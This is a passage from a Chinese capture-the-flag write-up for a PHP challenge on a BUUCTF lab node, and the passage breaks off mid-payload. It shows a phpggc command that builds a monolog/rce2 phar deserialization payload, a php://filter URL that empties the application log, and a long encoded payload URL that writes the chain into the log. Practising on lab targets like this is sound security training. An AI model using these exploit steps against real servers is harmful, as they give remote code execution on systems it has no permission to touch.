+<p>可以参考：<a href="https://www.anquanke.com/post/id/231459" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231459</a></p>
+<p>composer.json存在拓展monolog，phpggc刚好在版本范围内</p>
+<p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520095354.png" alt="image-20210520095352214"></p>
+<p>生成payload</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./phpggc</span> monolog/rce2 phpinfo 1 <span class="params">--phar</span> phar -o php:<span class="string">//output</span> | base64 -w0 | python -c <span class="string">"import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())"</span> &gt; payload.txt</span><br></pre></td></tr></table></figure>
+
+<p>清空日志文件</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dd60ec6c-<span class="number">4197</span>-<span class="number">4</span>c9b-<span class="number">8</span>dd0-<span class="number">8651</span>a607fa70.node3.buuoj.<span class="keyword">cn</span>/?<span class="keyword">file</span>=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=consumed/resource=../<span class="keyword">runtime</span>/logs/app.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+
+<p>写入payload，注意最后面有一个a（这是为了能完整地将payload解码出来）</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dd60ec6c-<span class="number">4197</span>-<span class="number">4</span>c9b-<span class="number">8d</span>d0-<span class="number">8651</span>a607fa70.node3.buuoj.cn/?file==<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=71=00=36</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=54</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=62</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=78</span>=<span class="number">00=49=00=59</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=62=00=47</span>=<span class="number">00=56=00=79</span>=<span class="number">00=58=00=46</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=56</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=63=00=45</span>=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=63</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=61=00=32</span>=<span class="number">00=56=00=30</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=76</span>=<span class="number">00=62=00=47</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=53=00=47</span>=<span class="number">00=46=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=61</span>=<span class="number">00=47=00=46</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=54</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=62</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=78</span>=<span class="number">00=49=00=59</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=62=00=47</span>=<span class="number">00=56=00=79</span>=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=41</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=47=00=68</span>=<span class="number">00=68=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=34</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=55=00=32</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=61</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00=78=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=73</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=46</span>=<span class="number">00=73=00=61</span>=<span class="number">00=58=00=70</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=43=00=49</span>=<span class="number">00=37=00=59</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=51</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=78=00=70</span>=<span class="number">00=62=00=57</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=30</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=42</span>=<span class="number">00=79=00=62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=76=00=63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00=33=00=56</span>=<span class="number">00=79=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=63</span>=<span class="number">00=47=00=68</span>=<span class="number">00=77=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=49=00=37</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=69=00=64</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=61</span>=<span class="number">00=58=00=70</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=30</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=62</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=77</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=34</span>=<span class="number">00=37=00=66</span>=<span class="number">00=58=00=31</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=73</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=51</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=75=00=61</span>=<span class="number">00=58=00=52</span>=<span class="number">00=70=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00=70=00=65</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=54=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=74=00=61</span>=<span class="number">00=58=00=51</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=54=00=45</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=63</span>=<span class="number">00</span>=<span class="number">48</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=63=00=32</span>=<span class="number">00=39=00=79</span>=<span class="number">00=63=00=79</span>=<span class="number">00=49=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=64=00=58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=77=00=61</span>=<span class="number">00=48=00=42</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=76=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00=30=00=46</span>=<span 